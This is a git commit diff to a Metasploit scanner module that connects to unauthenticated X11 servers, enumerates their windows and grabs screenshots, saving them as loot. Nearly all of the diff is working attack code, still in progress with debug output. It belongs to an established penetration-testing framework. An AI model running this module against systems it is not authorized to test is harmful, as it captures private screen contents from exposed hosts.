a524682f6334a2aefef5f63fec206cfd12648085
h00die <michaeltcyr@gmail.com>
2024-03-04 17:40:01 -0500

    x11 screenshot module progress

--- modules/auxiliary/scanner/x11/open_x11_screenshot.rb
+++ modules/auxiliary/scanner/x11/open_x11_screenshot.rb
@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'chunky_png'
+
 class MetasploitModule < Msf::Auxiliary
   include Exploit::Remote::Tcp
   include Auxiliary::Scanner
@@ -40,6 +42,32 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def read_data_from_network(object, max_attempts = 3)
+    received_data = ''
+    buffer_size = 1024
+    while (chunk = sock.recv(buffer_size))
+      received_data += chunk
+    
+      # Break out of the loop if we've received all the data
+      break if chunk.length < buffer_size
+    end
+
+    begin
+      error = X11ERROR.read(received_data)
+      raise StandardError if error.response_type == 1 # reply not an error, try to read the data in
+      vprint_bad("Got an error packet: #{error.inspect}")
+      return nil
+    rescue StandardError
+      # check if we got an error packet
+      begin
+        return object.read(received_data)
+      rescue StandardError
+        return nil
+      end
+    end
+  end
+
+
   def process_extension_query(packet, extension)
     begin
       extension_response = QUERYEXTENSIONRESPONSE.read(packet)
@@ -54,35 +82,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
     end
     extension_response
-  end
-
-  def convert_zpixmap_to_png(_zpixmap)
-    # Assume zpixmap_data is your array representing ZPixmap data
-    # You need to know the width, height, and color depth of the image
-    width = 100
-    height = 100
-    color_depth = 8 # 8-bit color depth for example
-
-    # Open a file for writing in binary mode
-    File.open('output.png', 'wb') do |file|
-      # PNG signature
-      file.write("\x89PNG\r\n\x1A\n".force_encoding('ASCII-8BIT'))
-
-      # IHDR chunk - Image Header
-      ihdr_data = [width, height, color_depth, 2, 0, 0, 0].pack('NNCCCCC')
-      file.write([ihdr_data.length, 'IHDR', ihdr_data, Zlib.crc32('IHDR' + ihdr_data)].pack('NA4A*N'))
-
-      # IDAT chunk - Image Data
-      idat_data = zpixmap_data.pack('C*')
-      file.write([idat_data.length, 'IDAT', idat_data, Zlib.crc32('IDAT' + idat_data)].pack('NA4A*N'))
-
-      # IEND chunk - End of Image
-      file.write([0, 'IEND', '', Zlib.crc32('IEND')].pack('NA4A*N'))
-    end
-  end
-
-  def has_children?(event_mask)
-    event_mask == 0 || event_mask == 256 || event_mask == 65536
   end
 
   def take_screenshot(connection)
@@ -182,22 +181,52 @@ class MetasploitModule < Msf::Auxiliary
     # @all_windows keeps track of all windows which are bigger than 1x1, aka visible windows.
     @all_windows = []
     get_process_tree(connection.screen_root, '')
-    puts @all_windows.inspect
+
     # determine the background image, it will have x/y offsets of 0, and the heigh/width will match the root
     # we go in reverse because we want the top most layer that satisfies these requirements
+    vprint_status('(16/15) Getting screenshot(s)')
     @all_windows.reverse.each do |window|
-      next unless window['x'] == 0 &&
-                  window['y'] == 0 &&
-                  window['height'] == connection.screen_height_in_pixels &&
-                  window['width'] == connection.screen_width_in_pixels
+      # next unless window['x'] == 0 &&
+      #            window['y'] == 0 &&
+      #            window['height'] == connection.screen_height_in_pixels &&
+      #            window['width'] == connection.screen_width_in_pixels
+      # puts window
+      next unless window['width'] > 10
+      next if window['name'].blank?
 
-      print_good("Found background image: #{window['window_id']} (#{window['window_int']})")
-      sock.put(GETIMAGEREQUEST.new(height: window['height'],
-                                   width: window['width'],
-                                   drawable: window['window_int']).to_binary_s)
-      GETIMAGERESPONSE.read(sock.get_once(-1, 1))
+      puts window
 
-      break
+      print_good("Found background image: #{window['window_id']} (#{window['window_int']}) => #{window['name']}")
+      # puts window.inspect
+      sock.put(GETIMAGEREQUEST.new(
+        height: window['height'],
+        width: window['width'],
+        x: window['x'],
+        y: window['y'],
+        drawable: window['window_int']
+      ).to_binary_s)
+      puts 'getting image response'
+      image = read_data_from_network(GETIMAGERESPONSE, 20)
+
+      next if image.nil?
+
+      puts "asking for color map 0x#{window['color_map'].to_i.to_s(16)}"
+
+      colors_request = GETCOLORSREQUEST.new(color_map: window['color_map'],
+                                            pixels: [0, 65793, 131586, 197379, 263172, 328965, 394758, 460551, 526344, 592137, 657930, 723723, 789516, 855309, 921102, 986895, 1052688, 1118481, 1184274, 1250067, 1315860, 1381653, 1447446, 1513239, 1579032, 1644825, 1710618, 1776411, 1842204, 1907997, 1973790, 2039583, 2105376, 2171169, 2236962, 2302755, 2368548, 2434341, 2500134, 2565927, 2631720, 2697513, 2763306, 2829099, 2894892, 2960685, 3026478, 3092271, 3158064, 3223857, 3289650, 3355443, 3421236, 3487029, 3552822, 3618615, 3684408, 3750201, 3815994, 3881787, 3947580, 4013373, 4079166, 4144959, 4210752, 4276545, 4342338, 4408131, 4473924, 4539717, 4605510, 4671303, 4737096, 4802889, 4868682, 4934475, 5000268, 5066061, 5131854, 5197647, 5263440, 5329233, 5395026, 5460819, 5526612, 5592405, 5658198, 5723991, 5789784, 5855577, 5921370, 5987163, 6052956, 6118749, 6184542, 6250335, 6316128, 6381921, 6447714, 6513507, 6579300, 6645093, 6710886, 6776679, 6842472, 6908265, 6974058, 7039851, 7105644, 7171437, 7237230, 7303023, 7368816, 7434609, 7500402, 7566195, 7631988, 7697781, 7763574, 7829367, 7895160, 7960953, 8026746, 8092539, 8158332, 8224125, 8289918, 8355711, 8421504, 8487297, 8553090, 8618883, 8684676, 8750469, 8816262, 8882055, 8947848, 9013641, 9079434, 9145227, 9211020, 9276813, 9342606, 9408399, 9474192, 9539985, 9605778, 9671571, 9737364, 9803157, 9868950, 9934743, 10000536, 10066329, 10132122, 10197915, 10263708, 10329501, 10395294, 10461087, 10526880, 10592673, 10658466, 10724259, 10790052, 10855845, 10921638, 10987431, 11053224, 11119017, 11184810, 11250603, 11316396, 11382189, 11447982, 11513775, 11579568, 11645361, 11711154, 11776947, 11842740, 11908533, 11974326, 12040119, 12105912, 12171705, 12237498, 12303291, 12369084, 12434877, 12500670, 12566463, 12632256, 12698049, 12763842, 12829635, 12895428, 12961221, 13027014, 13092807, 13158600, 13224393, 13290186, 13355979, 13421772, 13487565, 13553358, 13619151, 13684944, 13750737, 13816530, 13882323, 13948116, 14013909, 14079702, 14145495, 14211288, 14277081, 14342874, 14408667, 14474460, 14540253, 14606046, 14671839, 14737632, 14803425, 14869218, 14935011, 15000804, 15066597, 15132390, 15198183, 15263976, 15329769, 15395562, 15461355, 15527148, 15592941, 15658734, 15724527, 15790320, 15856113, 15921906, 15987699, 16053492, 16119285, 16185078, 16250871, 16316664, 16382457, 16448250, 16514043, 16579836, 16645629, 16711422, 16777215],
+                                            unused: 2)
+
+      sock.put(colors_request.to_binary_s)
+
+      colors = read_data_from_network(GETCOLORSRESPONSE, 10)
+
+      next if colors.nil?
+
+      x11_image = X11Image.new(window['height'], window['width'], image, colors) # XXX
+      image = x11_image.create_image
+      f = store_loot('x11.screenshot', 'image/x-png', rhost, image)
+      print_good("Image saved to: #{f}")
+      # break
     end
 
     # cleanup
@@ -211,20 +240,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{spaces}  Getting children for window 0x#{window.to_i.to_s(16)}")
     sock.put(QUERYTREEREQUEST.new(drawable: window).to_binary_s)
 
-    response = sock.get_once(-1, 1)
-    attempts_to_read_data = 1
-    trees = nil
-    while attempts_to_read_data < 3 && trees.nil?
-      begin
-        trees = QUERYTREERESPONSE.read(response)
-        break
-      rescue StandardError
-        vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
-      end
-      tmp_data = sock.get_once(-1, 1)
-      response << tmp_data unless tmp_data.nil?
-      attempts_to_read_data += 1
-    end
+    trees = read_data_from_network(QUERYTREERESPONSE)
+
     vprint_status("  #{spaces}Found #{trees.children.length} child windows") if !trees.children.empty?
     trees.children.sort.each_with_index do |child_window, i|
       # getwindowattributes+getgeometry
@@ -238,22 +255,22 @@ class MetasploitModule < Msf::Auxiliary
                                         get_property_type: @window_string_atom).to_binary_s)
 
       response = sock.get_once(-1, 1)
-      attempts_to_read_data = 1
+      attempts = 1
       window_attributes = nil
       window_geometry = nil
       window_name = nil
-      while attempts_to_read_data < 3 && (window_attributes.nil? || window_geometry.nil? || window_name.nil?)
+      while attempts <= 3 && (window_attributes.nil? || window_geometry.nil? || window_name.nil?)
         begin
           window_attributes = GETWINDOWRESPONSE.read(response[0..44])
           window_geometry = WINDOWATTRIBUTESGETGEOMETRYRESPONSE.read(response[44..76])
           window_name = X11GETPROPERTYRESPONSE.read(response[76..])
           break
         rescue StandardError
-          vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
+          vprint_bad("Failed to parse data, attempt #{attempts}/3 to get more")
         end
         tmp_data = sock.get_once(-1, 1)
         response << tmp_data unless tmp_data.nil?
-        attempts_to_read_data += 1
+        attempts += 1
       end
 
       if window_attributes.nil? || window_geometry.nil? || window_name.nil?
@@ -267,7 +284,9 @@ class MetasploitModule < Msf::Auxiliary
           'height' => window_geometry.height,
           'width' => window_geometry.width,
           'x' => window_geometry.x,
-          'y' => window_geometry.y
+          'y' => window_geometry.y,
+          'color_map' => window_attributes.colormap,
+          'name' => window_name.value_data
         })
       end
 
@@ -285,42 +304,36 @@ class MetasploitModule < Msf::Auxiliary
     connect # tcp connection establish
     vprint_status('(1/15) Establishing X11 connection')
     sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
-    packet = sock.get_once(-1, 1)
-    begin
-      connection = X11CONNECTION.read(packet)
-    rescue EOFError
-      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
-      packet += sock.get_once(-1, 1)
-    end
 
-    begin
-      connection = X11CONNECTION.read(packet)
-    rescue StandardError
-      vprint_bad('Failed to parse X11 connection initialization response packet')
+    connection = read_data_from_network(X11CONNECTION)
+
+    if connection.nil?
+      print_error('Unable to establish x11 session')
+      disconnect
+      return
+    elsif connection.success == 0
+      print_error("#{ip} Access Denied")
+      disconnect
       return
     end
 
-    if connection.success == 1
-      print_good("#{ip} - Successly established X11 connection")
-      # puts connection.inspect
-      vprint_status("  Vendor: #{connection.vendor}")
-      vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
-      vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
-      vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
-      vprint_status("  Screen root: #{connection.screen_root.inspect}")
-      report_note(
-        host: ip,
-        proto: 'tcp',
-        sname: 'x11',
-        port: rport,
-        type: 'x11.server_vendor',
-        data: "Open X Server (#{connection.vendor})"
-      )
+    print_good("#{ip} - Successly established X11 connection")
+    # puts connection.inspect
+    vprint_status("  Vendor: #{connection.vendor}")
+    vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
+    vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
+    vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
+    vprint_status("  Screen root: #{connection.screen_root.inspect}")
+    report_note(
+      host: ip,
+      proto: 'tcp',
+      sname: 'x11',
+      port: rport,
+      type: 'x11.server_vendor',
+      data: "Open X Server (#{connection.vendor})"
+    )
+    take_screenshot(connection)
 
-      take_screenshot(connection)
-    else
-      vprint_error("#{ip} Access Denied")
-    end
     disconnect
   end
 end
